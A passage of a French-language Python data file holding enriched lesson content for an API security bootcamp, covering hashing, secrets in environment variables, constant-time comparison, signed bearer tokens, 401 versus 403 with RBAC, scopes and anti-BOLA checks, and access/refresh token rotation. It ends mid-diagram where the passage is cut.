"""
Manuel de Référence Approfondi — Enrichissement des Chapitres (Jours 4 et 5).
Fournit pour chaque chapitre :
- context : exposé complet de la problématique d'ingénierie
- deep_sections : sous-chapitres de cours détaillés (fondements théoriques et mécanismes internes)
- architecture_diagram : schéma ASCII de flux mémoire ou réseau
- reference_table : tableau de synthèse technique
- pitfalls : anti-patterns de production vs standards industriels
- practical_exercises : exercices progressifs de révision post-bootcamp
"""

ENRICHMENT_D4_D5 = {
    # =========================================================================
    # JOUR 4 — CHAPITRE 4.1 : CRYPTOGRAPHIE APPLIQUÉE, VARIABLES D'ENVIRONNEMENT & API KEYS
    # =========================================================================
    "d4-l1": {
        "context": (
            "Dès qu'une API dépasse le stade d'un prototype local, elle manipule des ressources sensibles : dossiers RH, "
            "données financières, inscriptions officielles ou opérations d'administration. Ouvrir ces endpoints sans "
            "mécanisme de contrôle d'accès revient à laisser la salle des serveurs ouverte sur la rue.\n"
            "Pourtant, la majorité des failles de sécurité en entreprise ne proviennent pas d'attaques cryptographiques "
            "complexes, mais de **trois erreurs d'architecture fondamentales** :\n"
            "1. Confondre **encodage** (Base64), **hachage irréversible** (SHA-256 / PBKDF2) et **chiffrement** (AES).\n"
            "2. Écrire des clés secrètes ou mots de passe en dur dans le code source Python (`git commit`), les exposant "
            "définitivement dans l'historique du dépôt Git.\n"
            "3. Comparer des secrets avec l'opérateur standard `==`, ouvrant la porte aux **attaques temporelles (Timing Attacks)**.\n"
            "Ce chapitre pose les fondations cryptographiques rigoureuses indispensables à tout ingénieur backend."
        ),
        "deep_sections": [
            {
                "heading": "1. La distinction fondamentale : Encodage vs Hachage vs Chiffrement vs Signature HMAC",
                "body": (
                    "En ingénierie de sécurité, quatre opérations mathématiques sont régulièrement confondues par les développeurs débutants :\n"
                    "- **L'Encodage (ex: `Base64`, `UTF-8`, `URL-encoding`)** : N'a **aucune vocation de sécurité**. Son unique "
                    "but est de représenter des données binaires sous forme de caractères ASCII imprimables pour qu'elles traversent "
                    "sans corruption les protocoles textuels comme HTTP ou JSON. N'importe qui peut décoder du Base64 instantanément sans clé.\n"
                    "- **Le Hachage cryptographique (ex: `SHA-256`, `PBKDF2`, `bcrypt`, `Argon2`)** : Est une **fonction à sens unique (irréversible)**. "
                    "À partir d'une entrée de taille quelconque, elle produit une empreinte de taille fixe (64 caractères hexadécimaux pour SHA-256). "
                    "Il est mathématiquement impossible de retrouver le mot de passe d'origine à partir de son empreinte. Pour vérifier un mot de passe, "
                    "on hache la saisie de l'utilisateur et on compare les deux empreintes.\n"
                    "- **Le Salage (`Salt`) et dérivation lente (`PBKDF2` / `scrypt`)** : Si deux utilisateurs choisissent le même mot de passe, "
                    "leur hash SHA-256 brut sera identique, permettant les attaques par tables précalculées (*Rainbow Tables*). On ajoute donc "
                    "un **sel aléatoire unique** par mot de passe et on répète le hachage des centaines de milliers de fois (`generate_password_hash` "
                    "de Werkzeug) pour ralentir toute tentative de force brute par carte graphique (GPU).\n"
                    "- **La Signature HMAC (`Hash-based Message Authentication Code`)** : Combine un message et une **clé secrète serveur** "
                    "via une fonction de hachage pour prouver que le message n'a pas été falsifié en chemin."
                )
            },
            {
                "heading": "2. La règle n°3 de la méthodologie Twelve-Factor App : Externalisation des Secrets (`os.environ`)",
                "body": (
                    "Un code source applicatif est destiné à être partagé entre développeurs, audité dans GitLab/GitHub et analysé par des "
                    "outils d'intégration continue (CI/CD). Si une clé d'API (`SECRET_KEY`, mot de passe PostgreSQL, clé Stripe) est écrite "
                    "dans un fichier `.py`, même si vous la supprimez dans un commit ultérieur, **elle reste lisible à jamais dans l'historique Git (`git log -p`)**.\n"
                    "- La norme industrielle impose de stocker les secrets dans les **variables d'environnement du système d'exploitation**.\n"
                    "- En Python, le dictionnaire `os.environ` (du module standard `os`) permet de lire ces variables injectées au démarrage du "
                    "conteneur Docker ou du service `systemd` : `os.environ.get(\"API_SECRET_KEY\")`.\n"
                    "- En développement local uniquement, on utilise une valeur de secours (*fallback*) explicite ou un fichier `.env` ignoré par Git (`.gitignore`)."
                )
            },
            {
                "heading": "3. Authentification Machine-to-Machine par `X-API-Key` et parade aux Timing Attacks (`hmac.compare_digest`)",
                "body": (
                    "Lorsqu'un serveur partenaire (ex: le système de facturation d'une filiale) interroge votre API sans intervention humaine, "
                    "le modèle le plus direct consiste à lui attribuer une **clé d'API (`API Key`)** transmise dans un en-tête HTTP dédié comme `X-API-Key`.\n"
                    "- **Pourquoi ne jamais passer l'API Key dans l'URL (`?api_key=secret`) ?** Parce que les URLs complètes sont enregistrées en clair "
                    "dans les journaux d'accès (logs Nginx, proxies d'entreprise, historique navigateur).\n"
                    "- **Pourquoi `if cle_recue == cle_attendue:` est une faille critique ?** L'opérateur `==` compare les chaînes caractère par caractère "
                    "et s'arrête dès la première différence (court-circuit). En mesurant le temps de réponse du serveur à la nanoseconde près sur des "
                    "milliers de requêtes, un attaquant devine le premier caractère (qui prend légèrement plus de temps avant d'échouer sur le second), "
                    "puis le deuxième, et reconstitue toute la clé en quelques minutes.\n"
                    "- **La solution `hmac.compare_digest(a, b)`** : Cette fonction du module standard `hmac` compare tous les octets en **temps constant**, "
                    "quel que soit le nombre de caractères exacts, neutralisant totalement l'attaque temporelle."
                )
            }
        ],
        "architecture_diagram": (
            "FLUX DE VÉRIFICATION D'IDENTITÉ MACHINE (X-API-KEY) & MOT DE PASSE SALÉ\n"
            "========================================================================\n\n"
            "  [1] VÉRIFICATION D'UNE CLÉ D'API EN TEMPS CONSTANT :\n"
            "  Client HTTP                                     Serveur FastAPI (Depends)\n"
            "  En-tête : X-API-Key: isgp-live-98a7...  ----->  x_api_key: str = Header(alias='X-API-Key')\n"
            "                                                  cle_serveur = os.environ.get('PARTNER_API_KEY')\n"
            "                                                        |\n"
            "                                                  hmac.compare_digest(x_api_key, cle_serveur)\n"
            "                                                  (Durée d'exécution constante : 0 fuite temporelle)\n\n"
            "  [2] STOCKAGE IRRÉVERSIBLE D'UN MOT DE PASSE UTILISATEUR (PBKDF2 / SCRYPT) :\n"
            "  Mot de passe clair : \"Formation2026!\"\n"
            "        +\n"
            "  Sel aléatoire (16 octets) : \"8f3d9a1c...\"\n"
            "        |\n"
            "        v  (600 000 itérations de hachage SHA-256)\n"
            "  Empreinte stockée en BDD : \"pbkdf2:sha256:600000$8f3d9a1c$e4b9012f8a...\" (Irréversible)"
        ),
        "reference_table": {
            "title": "Comparatif des Mécanismes Cryptographiques en Architecture API",
            "headers": ["Mécanisme Cryptographique", "Réversibilité", "Clé Secrète Requise ?", "Fonction Python Standard", "Cas d'Usage en Architecture API"],
            "rows": [
                ["Encodage Base64", "Oui (immédiate, publique)", "Non", "`base64.urlsafe_b64encode()`", "Transport de données binaires ou JSON dans un en-tête HTTP"],
                ["Hachage rapide (SHA-256)", "Non (irréversible)", "Non", "`hashlib.sha256(data).hexdigest()`", "Empreinte d'intégrité d'un fichier ou d'une clé d'API haute entropie"],
                ["Hachage lent salé (PBKDF2 / Scrypt)", "Non (irréversible + lent)", "Non (Sel aléatoire inclus)", "`hashlib.pbkdf2_hmac('sha256', ...)`", "Stockage sécurisé des mots de passe humains en base de données"],
                ["Signature HMAC-SHA256", "Non (vérification par recalcul)", "Oui (Clé secrète serveur)", "`hmac.new(key, msg, hashlib.sha256)`", "Signature de jetons JWT/Bearer et authentification de Webhooks"],
                ["Comparaison à temps constant", "N/A (Opérateur booléen)", "N/A", "`hmac.compare_digest(val1, val2)`", "Comparaison sécurisée de deux secrets (contre les Timing Attacks)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker les mots de passe avec `hashlib.md5()` ou `sha256()` sans sel",
                "good": "Utiliser une fonction de dérivation lente avec salage automatique (`hashlib.pbkdf2_hmac` / `Argon2`)",
                "why": "Les cartes graphiques (GPU) calculent plus de 50 milliards d'empreintes SHA-256 par seconde et cassent les mots de passe courants instantanément sans sel ni itérations lentes."
            },
            {
                "bad": "Passer la clé d'API dans les paramètres de requête URL (`GET /api/rapports?api_key=secret123`)",
                "good": "Transmettre systématiquement les clés et jetons dans les en-têtes HTTP (`Header(alias='X-API-Key')` ou `Authorization`)",
                "why": "Les URLs complètes sont archivées en clair dans les fichiers `access.log` de tous les serveurs mandataires et dans l'historique navigateur."
            },
            {
                "bad": "Écrire `SECRET_KEY = 'mon_secret_de_prod'` directement dans `app.py` et pousser sur Git",
                "good": "Lire les secrets exclusivement depuis l'environnement système via `os.environ.get('API_SECRET_KEY')`",
                "why": "Tout secret commité dans Git reste lisible indéfiniment dans l'historique `git log -p` même après suppression."
            }
        ],
        "practical_exercises": [
            "Générez deux empreintes successives du même mot de passe `\"Bootcamp2026\"` avec `generate_password_hash(\"Bootcamp2026\")` et affichez-les : expliquez pourquoi les deux chaînes obtenues sont totalement différentes et comment `check_password_hash()` parvient malgré tout à valider les deux.",
            "Créez un dictionnaire serveur associant trois clés d'API (stockées sous forme d'empreintes SHA-256) à trois noms d'applications partenaires, puis écrivez une route `/api/partenaire/commandes` qui identifie quel partenaire appelle l'API."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.2 : JETONS SIGNÉS (BEARER TOKENS / JWT) & EXPIRATION
    # =========================================================================
    "d4-l2": {
        "context": (
            "Lorsqu'un utilisateur humain se connecte depuis une application mobile ou une interface React/Vue, "
            "on ne peut pas lui demander de ressaisir son mot de passe à chaque clic, ni stocker son mot de passe "
            "en clair dans la mémoire du téléphone.\n"
            "Dans une architecture Web classique à rendu serveur, on utilisait des **sessions en mémoire serveur** "
            "(un identifiant de session stocké en RAM ou dans une table SQL, associé à un cookie). Mais dans une "
            "architecture d'API moderne distribuée sur 10 ou 50 conteneurs serveurs derrière un répartiteur de charge "
            "(Load Balancer), partager la mémoire RAM entre les serveurs devient un goulot d'étranglement.\n"
            "La solution standard de l'industrie est l'authentification **Stateless par Jeton Signé (`Bearer Token` / `JWT`)** : "
            "après avoir vérifié le mot de passe une seule fois sur `POST /api/login`, le serveur délivre au client un "
            "**passeport numérique infalsifiable et limité dans le temps**."
        ),
        "deep_sections": [
            {
                "heading": "1. Anatomie complète d'un jeton signé (Modèle JWT : `Header.Payload.Signature`)",
                "body": (
                    "Un jeton signé standard (comme un **JWT — JSON Web Token**, RFC 7519, ou un jeton signé `itsdangerous` dans l'écosystème Python/FastAPI) "
                    "est composé de segments encodés en Base64URL séparés par des points `.` :\n"
                    "1. **Le `Header` (En-tête)** : Décrit les métadonnées cryptographiques, notamment l'algorithme de signature utilisé (ex: `HS256` pour HMAC-SHA256).\n"
                    "2. **Le `Payload` (Charge utile / `Claims`)** : Contient les déclarations d'identité et de droits de l'utilisateur sous forme d'objet JSON : "
                    "`sub` (Subject : identifiant unique de l'utilisateur), `role` (`admin`, `formateur`), `iat` (*Issued At* : horodatage d'émission) et "
                    "`exp` (*Expiration Time* : horodatage limite de validité).\n"
                    "3. **La `Signature` cryptographique** : Le serveur calcule `HMAC_SHA256(Base64(Header) + \".\" + Base64(Payload), SECRET_KEY)`. "
                    "Seul le serveur possède la `SECRET_KEY` en mémoire vive."
                )
            },
            {
                "heading": "2. Vérité cruciale : Un jeton signé est LISIBLE par tous, mais INFALSIFIABLE (`Signé != Chiffré`)",
                "body": (
                    "C'est l'erreur de compréhension la plus fréquente lors des entretiens techniques et en production :\n"
                    "- Le `Payload` d'un jeton JWT ou `itsdangerous` est simplement **encodé en Base64URL**, il n'est **PAS chiffré**.\n"
                    "- Si vous copiez un jeton JWT sur un outil ou que vous exécutez `base64.urlsafe_b64decode()`, vous lirez en clair "
                    "`{\"user_id\": 42, \"role\": \"lecteur\"}` sans avoir besoin de la clé secrète.\n"
                    "- **Conséquence n°1 (Confidentialité)** : Ne mettez **JAMAIS** de données secrètes (mot de passe, numéro de carte bancaire, clé privée) "
                    "à l'intérieur du Payload d'un jeton.\n"
                    "- **Conséquence n°2 (Intégrité)** : Pourquoi un attaquant ne peut-il pas décoder son jeton, remplacer `\"lecteur\"` par `\"admin\"`, "
                    "et le ré-encoder en Base64 ? Parce que dès qu'un seul bit du Payload change, la signature HMAC recalculée par le serveur "
                    "ne correspondra plus à la signature attachée au jeton. Le serveur rejettera immédiatement le jeton avec une exception `BadSignature` (`401`)."
                )
            },
            {
                "heading": "3. Le protocole d'échange `Authorization: Bearer <token>` et l'injection `Depends(HTTPBearer)`",
                "body": (
                    "Le standard HTTP (RFC 6750) définit la manière exacte dont le client présente son jeton à chaque requête :\n"
                    "- Le client ajoute l'en-tête HTTP : `Authorization: Bearer <jeton_signe>`.\n"
                    "- Le mot-clé `Bearer` signifie littéralement **« Au porteur »** : quiconque détient ce jeton valide est considéré comme authentifié "
                    "(d'où l'obligation absolue d'utiliser HTTPS en production pour empêcher l'écoute réseau).\n"
                    "- Côté FastAPI, `HTTPBearer` et `Depends(verifier_bearer_token)` extraient l'en-tête et `itsdangerous.URLSafeTimedSerializer` vérifie l'horodatage certifié lors du `dumps()`. "
                    "Lors de la vérification par `loads(jeton, max_age=3600)`, le serveur vérifie simultanément deux choses :\n"
                    "  1. La signature cryptographique est-elle intacte ? (Sinon -> `BadSignature`).\n"
                    "  2. L'âge du jeton est-il inférieur à `max_age` secondes ? (Sinon -> `SignatureExpired`)."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE VIE D'UN JETON SIGNÉ STATELESS (BEARER TOKEN / JWT)\n"
            "============================================================\n\n"
            "  [ÉTAPE 1 : CONNEXION INITIALE (POST /api/auth/token)]\n"
            "  Client Mobile / Web                              Serveur FastAPI (Stateless)\n"
            "  {\"identifiant\": \"amine\", \"mot_de_passe\": \"...\"} -> 1. Vérifie le mot de passe (compare_digest)\n"
            "                                                   2. Crée Payload {\"sub\": \"amine\", \"role\": \"admin\"}\n"
            "                                                   3. Signe avec SECRET_KEY + Timestamp actuel\n"
            "  Stocke le token en mémoire               <-----  200 OK : {\"access_token\": \"eyJ...Signature\"}\n\n"
            "  [ÉTAPE 2 : REQUÊTE SUR ROUTE PROTÉGÉE (GET /api/auth/profil)]\n"
            "  En-tête HTTP :\n"
            "  Authorization: Bearer eyJ...Signature     -----> 1. Depends(verifier_bearer_token) extrait le token\n"
            "                                                   2. Recalcule HMAC(Payload, SECRET_KEY)\n"
            "                                                   3. Vérifie Horodatage <= max_age\n"
            "  Reçoit les données métier                <-----  200 OK (Aucune requête SQL de session requise !)"
        ),
        "reference_table": {
            "title": "États de Validation d'un Jeton Signé (`Bearer Token`)",
            "headers": ["Scénario de Vérification du Jeton", "Exception Levée (`itsdangerous`)", "Code HTTP Standard", "Cause Technique Exacte", "Action Attendue du Client"],
            "rows": [
                ["En-tête `Authorization` absent ou sans préfixe `Bearer `", "Aucune (rejet pré-vérification)", "`401 Unauthorized`", "Le client n'a fourni aucune preuve d'identité valide", "Rediriger vers l'écran de connexion (`/api/login`)"],
                ["Signature valide et âge <= `max_age`", "Aucune (Succès)", "`200 OK`", "Jeton authentique, intègre et non expiré", "Exploiter la réponse JSON normalement"],
                ["Signature valide mais âge > `max_age`", "`SignatureExpired`", "`401 Unauthorized`", "Le jeton a dépassé sa durée de vie autorisée", "Utiliser le `refresh_token` ou demander une reconnexion"],
                ["Payload modifié ou signé avec une mauvaise clé", "`BadSignature`", "`401 Unauthorized`", "Tentative de falsification du Payload ou rotation de `SECRET_KEY`", "Purger le jeton local et forcer la reconnexion"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Stocker des informations confidentielles (mot de passe, clé interne) dans le Payload d'un jeton signé",
                "good": "Ne stocker dans le Payload que les identifiants publics nécessaires au contrôle d'accès (`sub`, `role`, `scopes`)",
                "why": "Un jeton signé est encodé en Base64URL et non chiffré : quiconque possède le jeton peut lire son Payload en clair sans clé."
            },
            {
                "bad": "Émettre des jetons sans date d'expiration (ou valables 1 an)",
                "good": "Imposer une durée de vie courte sur les jetons d'accès (`max_age=900` à `3600` secondes)",
                "why": "Un jeton Stateless ne pouvant pas être annulé sans état serveur, limiter sa durée de vie réduit la fenêtre d'exposition en cas d'interception."
            },
            {
                "bad": "Placer `except BadSignature:` avant `except SignatureExpired:` dans le bloc `try / except`",
                "good": "Toujours placer `except SignatureExpired:` **avant** `except BadSignature:`",
                "why": "`SignatureExpired` est une sous-classe de `BadSignature` ; si `BadSignature` est testé en premier, il capture aussi les jetons expirés."
            }
        ],
        "practical_exercises": [
            "Prenez un jeton généré par la route `POST /api/login`, modifiez un seul caractère au milieu de la chaîne, puis envoyez-le dans `Authorization: Bearer ...` : observez comment le serveur détecte l'altération.",
            "Modifiez la route `/api/profil-protege` pour renvoyer également dans la réponse JSON le nombre de secondes restantes avant l'expiration du jeton (en passant `return_timestamp=True` à `serializer.loads()`)."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.3 : AUTHENTIFICATION (AUTHN / 401) VS AUTORISATION (AUTHZ / 403, RBAC, SCOPES, BOLA)
    # =========================================================================
    "d4-l3": {
        "context": (
            "Dans la gestion des APIs (*API Management*) et la sécurité applicative, la confusion entre "
            "**Authentification (`AuthN`)** et **Autorisation (`AuthZ`)** est à l'origine de la faille n°1 mondiale "
            "du classement **OWASP API Security Top 10** : les failles d'autorisation (`BOLA` — *Broken Object Level Authorization* "
            "et `BFLA` — *Broken Function Level Authorization*).\n"
            "Trop souvent, les développeurs vérifient uniquement que l'utilisateur possède un jeton valide (`AuthN`), "
            "puis exécutent la requête sans vérifier si cet utilisateur précis a le **droit métier (`AuthZ`)** d'effectuer "
            "cette action ou de consulter cet enregistrement spécifique. Ce chapitre établit une séparation chirurgicale "
            "entre l'identité (`401`) et la permission (`403`) à travers les trois piliers de l'autorisation moderne : "
            "**RBAC**, **Scopes OAuth2** et **Propriété de la ressource (Anti-BOLA)**."
        ),
        "deep_sections": [
            {
                "heading": "1. `AuthN` (Qui êtes-vous ? -> `401`) vs `AuthZ` (Que pouvez-vous faire ? -> `403`)",
                "body": (
                    "Pour mémoriser définitivement la différence, prenons l'analogie d'un **ministère ou d'un siège d'entreprise sécurisé** :\n"
                    "- **L'Authentification (`AuthN`) — Le contrôle d'identité au portique d'entrée** : Vous présentez votre carte nationale "
                    "d'identité ou votre badge nominatif. L'agent de sécurité vérifie que la carte n'est pas falsifiée et qu'elle n'est pas expirée. "
                    "Si vous n'avez pas de badge ou qu'il est expiré, l'agent ignore qui vous êtes : c'est le code HTTP **`401 Unauthorized`** "
                    "(qui signifie en réalité *Unauthenticated* dans la spécification RFC 9110).\n"
                    "- **L'Autorisation (`AuthZ`) — Les droits d'accès aux portes internes** : Une fois entré dans le bâtiment avec votre badge "
                    "valide de *Stagiaire*, vous tentez d'ouvrir la porte de la *Salle des Coffres Financiers*. Le lecteur optique reconnaît "
                    "parfaitement votre identité (`AuthN` réussie !), mais consulte la matrice des permissions et constate que le statut *Stagiaire* "
                    "n'a pas l'habilitation requise. Se reconnecter avec le même badge ne changera rien : c'est le code HTTP **`403 Forbidden`**.\n"
                    "- **Règle d'architecture absolue** : L'Autorisation (`AuthZ`) s'exécute **toujours après** l'Authentification (`AuthN`). On ne peut "
                    "pas évaluer les permissions d'un appelant anonyme non identifié."
                )
            },
            {
                "heading": "2. Les 3 niveaux d'Autorisation (`AuthZ`) en API Management : RBAC, Scopes OAuth2 et Anti-BOLA",
                "body": (
                    "Une architecture d'API professionnelle combine trois niveaux complémentaires de contrôle d'autorisation :\n"
                    "1. **Niveau 1 — `RBAC` (*Role-Based Access Control* / Contrôle par Rôle)** : L'accès aux fonctionnalités sensibles est "
                    "conditionné par le rôle global de l'utilisateur (`lecteur`, `formateur`, `admin`). Exemple : seul le rôle `admin` "
                    "peut appeler `DELETE /api/formations/<id>`.\n"
                    "2. **Niveau 2 — `Scopes` OAuth2 (Permissions granulaires déléguées)** : Lorsqu'un utilisateur génère un jeton pour une "
                    "application tierce ou un script d'automatisation, il ne veut pas que ce jeton dispose de tous ses pouvoirs d'administrateur. "
                    "On restreint donc le jeton à une liste de **Scopes** explicites comme `[\"notes:read\"]` sans `\"notes:write\"`. Même si "
                    "le propriétaire du compte est `admin`, ce jeton précis se verra opposer un `403 Forbidden` s'il tente une écriture.\n"
                    "3. **Niveau 3 — Contrôle de propriété de l'objet (`Anti-BOLA` / *Object-Level Authorization*)** : C'est la défense contre la "
                    "faille **OWASP API1:2023 (BOLA)**. Si l'étudiant `yasmine` (authentifiée avec succès, rôle `etudiant`, scope `bulletins:read`) "
                    "appelle `GET /api/bulletins/yasmine`, elle reçoit `200 OK`. Mais si elle modifie l'URL en `GET /api/bulletins/karim`, le serveur "
                    "doit impérativement vérifier `jeton[\"sub\"] == proprietaire_ressource` (ou `jeton[\"role\"] == \"admin\"`). Sans ce test, "
                    "n'importe quel client connecté peut aspirer toute la base de données en incrémentant les identifiants dans l'URL !"
                )
            },
            {
                "heading": "3. Implémentation d'un pipeline de sécurité multicouche dans FastAPI (`Depends`)",
                "body": (
                    "Dans FastAPI, le système d'injection de dépendances **`Depends(...)`** permet de chaîner proprement AuthN et AuthZ :\n"
                    "- **Étape 1 (`verifier_authn`)** : Extrait le jeton `Bearer`, vérifie la signature cryptographique "
                    "et retourne le dictionnaire `user`. En cas d'échec, lève immédiatement `HTTPException(status_code=401)`.\n"
                    "- **Étape 2 (`exiger_scopes(...)` qui dépend de `verifier_authn`)** : Vérifie que les scopes requis figurent dans "
                    "`user[\"scopes\"]`. En cas d'échec, lève `HTTPException(status_code=403)` en précisant la permission manquante.\n"
                    "- **Étape 3 (Vérification métier Anti-BOLA dans la route)** : Compare l'identifiant du demandeur (`user[\"sub\"]`) avec "
                    "le champ `proprietaire` de l'enregistrement avant de retourner ou modifier la ressource."
                )
            }
        ],
        "architecture_diagram": (
            "PIPELINE DÉCISIONNEL : AUTHENTIFICATION (401) VS AUTORISATION (403)\n"
            "===================================================================\n\n"
            "  Requête HTTP : DELETE /api/bulletins/karim\n"
            "        |\n"
            "        v\n"
            "  +-------------------------------------------------------------------+\n"
            "  | ÉTAPE 1 : AUTHENTIFICATION (AuthN — Qui est l'appelant ?)         |\n"
            "  | Le jeton Bearer est-il présent, authentique (HMAC) et non expiré ?|\n"
            "  +-------------------------------------------------------------------+\n"
            "        | NON                                     | OUI (ex: sub=\"yasmine\", role=\"etudiant\")\n"
            "        v                                         v\n"
            "  [ 401 UNAUTHORIZED ]            +-------------------------------------------------------------------+\n"
            "  \"Identité inconnue ou expirée.  | ÉTAPE 2 : AUTORISATION (AuthZ — A-t-elle le droit d'agir ?)       |\n"
            "   Veuillez vous authentifier.\"   | 2a. RBAC   : Le rôle est-il autorisé sur cette route ?            |\n"
            "                                  | 2b. SCOPES : Le jeton possède-t-il le scope 'bulletins:write' ?   |\n"
            "                                  | 2c. BOLA   : Est-elle propriétaire ('yasmine' == 'karim') ?       |\n"
            "                                  +-------------------------------------------------------------------+\n"
            "                                        | NON                                     | OUI\n"
            "                                        v                                         v\n"
            "                                  [ 403 FORBIDDEN ]                         [ 200 OK / ACTION EXÉCUTÉE ]\n"
            "                                  \"Identité reconnue (yasmine), mais\n"
            "                                   droits insuffisants pour cet objet.\""
        ),
        "reference_table": {
            "title": "Matrice de Séparation : Authentification (`AuthN`) vs Autorisation (`AuthZ`) vs Anti-BOLA",
            "headers": ["Dimension Comparée", "Authentification (`AuthN`)", "Autorisation (`AuthZ`)", "Protection Anti-BOLA (OWASP #1)"],
            "rows": [
                ["Question posée par le serveur", "« Qui êtes-vous ? Prouvez votre identité. »", "« Avez-vous la permission d'exécuter cette action ? »", "« Cet enregistrement précis vous appartient-il ? »"],
                ["Éléments inspectés", "En-tête `Authorization: Bearer`, signature HMAC, expiration `exp`", "Attributs `role` (RBAC) et `scopes` (OAuth2) du jeton", "Comparaison `token.sub == ressource.owner_id` en base"],
                ["Code HTTP en cas d'échec", "`401 Unauthorized` (+ en-tête `WWW-Authenticate`)", "`403 Forbidden`", "`403 Forbidden` (ou `404` pour masquer l'existence)"],
                ["Action corrective côté client", "Se connecter (`POST /api/login`) ou rafraîchir le jeton", "Demander une élévation de privilèges à l'administrateur", "Aucune : accès illégitime aux données d'un tiers bloqué"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Renvoyer `401 Unauthorized` lorsqu'un utilisateur connecté avec le rôle `etudiant` tente d'accéder à `/api/admin`",
                "good": "Renvoyer `401` uniquement si l'identité est absente/invalide, et `403 Forbidden` si les permissions sont insuffisantes",
                "why": "Les applications frontales interprètent `401` comme une expiration de session et déconnectent l'utilisateur ou bouclent sur `/refresh`."
            },
            {
                "bad": "Masquer le bouton « Supprimer » dans l'interface React/mobile sans vérifier le rôle et le propriétaire côté serveur Flask",
                "good": "Appliquer systématiquement les contrôles `AuthZ` (RBAC, Scopes et Anti-BOLA) dans le code Python du serveur",
                "why": "Un attaquant utilise `curl` directement et contourne totalement l'interface graphique du navigateur."
            },
            {
                "bad": "Vérifier que le jeton est valide sur `GET /api/bulletins/<id>` sans vérifier à qui appartient le bulletin `<id>`",
                "good": "Comparer systématiquement `identite['sub'] == bulletin['owner']` (ou `identite['role'] == 'admin'`)",
                "why": "L'absence de contrôle de propriété sur l'objet (BOLA / IDOR) permet à tout utilisateur connecté d'aspirer les dossiers de tous les autres utilisateurs."
            }
        ],
        "practical_exercises": [
            "Utilisez le laboratoire ou `curl` pour tester les 4 profils de jetons sur `/api/sandbox/authz-demo` (`anonyme`, `etudiant_lecture`, `formateur_restreint`, `admin_complet`) en faisant varier l'action (`lecture` vs `ecriture`) et la cible (`propre_dossier` vs `dossier_tiers`).",
            "Écrivez une fonction de contrôle `verifier_acces_document(identite_jeton, document)` qui autorise la lecture si l'utilisateur est propriétaire du document, s'il appartient au même département avec le rôle `manager`, ou s'il est `admin`."
        ]
    },

    # =========================================================================
    # JOUR 4 — CHAPITRE 4.4 : ROTATION ACCESS / REFRESH TOKENS & DÉCORATEUR @EXIGER_ROLE
    # =========================================================================
    "d4-l4": {
        "context": (
            "Nous avons vu au chapitre 4.2 qu'un jeton Stateless (`Access Token`) ne peut pas être facilement annulé "
            "avant sa date d'expiration sans consulter une base de données. Cela pose un dilemme d'architecture :\n"
            "- Si on fixe la durée de vie de l'`Access Token` à **30 jours**, l'utilisateur reste connecté confortablement, "
            "mais si son jeton est volé ou si un employé quitte l'entreprise, il conserve un accès complet pendant un mois.\n"
            "- Si on fixe la durée de vie de l'`Access Token` à **15 minutes**, la sécurité est maximale, mais déconnecter "
            "l'utilisateur toutes les 15 minutes en lui redemandant son mot de passe détruit l'expérience utilisateur.\n"
            "L'industrie résout ce paradoxe grâce à l'**architecture à double jeton (`Access Token` court + `Refresh Token` long)** "
            "couplée à une **liste de révocation (`Token Blacklist`)** et à des **décorateurs Python réutilisables (`@exiger_role`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Le duo `Access Token` (15 min, Stateless) et `Refresh Token` (7 à 30 jours, Révocable)",
                "body": (
                    "Lors d'une authentification réussie sur `POST /api/auth/login`, le serveur émet **deux jetons distincts** "
                    "(signés avec deux sels cryptographiques différents `salt=\"access\"` et `salt=\"refresh\"`) :\n"
                    "1. **L'`Access Token` (durée très courte : 5 à 15 minutes)** : C'est le jeton envoyé à chaque requête métier "
                    "(`GET /api/stages`, `POST /api/inscriptions`). Sa vérification est purement cryptographique (ultra-rapide, en RAM).\n"
                    "2. **Le `Refresh Token` (durée longue : 7 à 30 jours)** : Ce jeton ne permet d'appeler **aucune route métier**. "
                    "Son unique utilité est d'être présenté à l'endpoint dédié `POST /api/auth/refresh` lorsque l'`Access Token` vient "
                    "d'expirer, afin d'obtenir silencieusement un nouvel `Access Token` tout neuf de 15 minutes sans redemander le mot de passe."
                )
            },
            {
                "heading": "2. Révocation immédiate (`Blacklist` / Redis) et Rotation des Refresh Tokens",
                "body": (
                    "Que se passe-t-il si un utilisateur clique sur « Se déconnecter » ou si l'équipe de sécurité détecte une compromission ?\n"
                    "- On envoie le `Refresh Token` à `POST /api/auth/revoke` (ou `/logout`). Le serveur l'ajoute à une **liste noire (`REVOKED_TOKENS`)** "
                    "stockée en production dans une base en mémoire ultra-rapide comme **Redis** (avec un TTL égal à la durée restante du jeton).\n"
                    "- Dès lors, même si la signature cryptographique du `Refresh Token` est encore mathématiquement valide, la route `/api/auth/refresh` "
                    "vérifie s'il figure dans `REVOKED_TOKENS` et bloque net toute émission de nouvel `Access Token`.\n"
                    "- En empêchant par ailleurs qu'un `Refresh Token` puisse être utilisé directement sur une route métier (grâce à la séparation "
                    "des sels `salt=\"access-v1\"` vs `salt=\"refresh-v1\"`), on confine la vérification d'état au seul endpoint de renouvellement."
                )
            },
            {
                "heading": "3. Factoriser la sécurité avec une fabrique de dépendances FastAPI (`Depends(exiger_role('admin'))`)",
                "body": (
                    "Copier-coller 25 lignes de lecture d'en-tête `Authorization`, de `try / except SignatureExpired` et de vérification de rôle "
                    "au début de chacune des 80 routes d'une API viole le principe **DRY (*Don't Repeat Yourself*)** et garantit des oublis.\n"
                    "- Dans FastAPI, on crée une **fabrique de dépendances** `def exiger_role(role_requis: str):` qui retourne une fonction `dependance(user: dict = Depends(verifier_access_token))`.\n"
                    "- Il suffit ensuite d'écrire `user: dict = Depends(exiger_role(\"admin\"))` dans la signature de n'importe quelle route (ou `dependencies=[Depends(exiger_role(\"admin\"))]` sur un `APIRouter` entier) !"
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE ROTATION ACCESS TOKEN / REFRESH TOKEN & RÉVOCATION\n"
            "===========================================================\n\n"
            "  Client                                      Serveur FastAPI\n"
            "  1. POST /api/auth/login              -----> Vérifie identifiants\n"
            "     Reçoit Access (15m) + Refresh (7j)<----- Signe Access (salt='access') & Refresh (salt='refresh')\n"
            "        |\n"
            "  2. GET /api/formations (Pendant 15m) -----> Depends(exiger_role) vérifie Access Token -> 200 OK\n"
            "        |\n"
